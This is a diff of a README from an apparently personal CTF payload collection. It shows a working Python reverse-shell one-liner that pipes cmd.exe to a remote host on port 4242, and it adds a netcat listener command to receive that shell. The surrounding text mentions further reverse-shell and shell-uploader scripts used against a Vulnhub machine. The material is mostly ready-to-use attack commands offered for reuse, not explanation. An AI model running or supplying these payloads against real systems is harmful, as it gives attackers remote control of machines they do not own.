@@ -45,6 +45,11 @@ This repository contains all of the payloads I've used in my CTFs, some of this 
   python3 -c "import socket,os,threading,subprocess as sp;p=sp.Popen(['cmd.exe'],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT);s=socket.socket();s.connect(('10.0.0.1',4242));threading.Thread(target=exec,args=(\"while(True):o=os.read(p.stdout.fileno(),1024);s.send(o)\",globals()),daemon=True).start();threading.Thread(target=exec,args=(\"while(True):i=s.recv(1024);os.write(p.stdin.fileno(),i)\",globals())).start()"
   ```
 
+- Listener
+  ```bash
+  nc -lnvp 4242
+  ```
+  
 ## About the scripts
 
 - Some of the scripts I upload are for reverse-shell also one of them are for windows which is the powershell script and the C one is a shell uploader, I used that in Momentum 2 CTF from Vulnhub to upload a shell inside the server.
